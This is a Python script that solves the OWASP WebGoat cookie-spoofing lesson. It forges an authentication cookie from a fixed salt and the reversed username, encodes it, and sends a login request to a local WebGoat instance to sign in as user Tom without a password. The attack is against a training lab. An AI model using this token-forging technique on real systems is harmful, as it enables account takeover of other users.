##################################################
## Python script for spoofing authentication cookie and login as Tom via POST request
##################################################
## Author: Micah Wieburg
## License: MIT License
## Copyright: Copyright (c) 2024 mwieburg
## Project: OWASP Webgoat

import requests
import sys
import base64

try:
   #Assign script parameters
   sessionID = sys.argv[1]
   username = str(sys.argv[2])
   password=''
   #Create request body
   body='username='+str(username)+'&password='+str(password)
   #Random value for spoof token base text
   salt = 'BBBEAAADDD'
   #Reverse username
   user_reverse = ''+username[::-1]
   #Concate salt and reversed username
   base_text = salt+user_reverse
   #Convert text to hex and then base64
   hex_text = base_text.encode("ascii").hex()
   hex_bytes = hex_text.encode()
   base64_bytes = base64.b64encode(hex_bytes)
   spoofAuth = base64_bytes.decode("ascii")

   #Create headers with spoofed authentication token
   headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/x-www-form-urlencoded',
		 'Cookie':'JSESSIONID='+str(sessionID)+';spoof_auth="'+str(spoofAuth)+'"',
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
    }
   #Send post request
   response = requests.post('http://localhost:8080/WebGoat/SpoofCookie/login',body,timeout=5, headers=headers)
   data = response.json()
   print(data)

except Exception as error:
  print("An exception occured:", error)
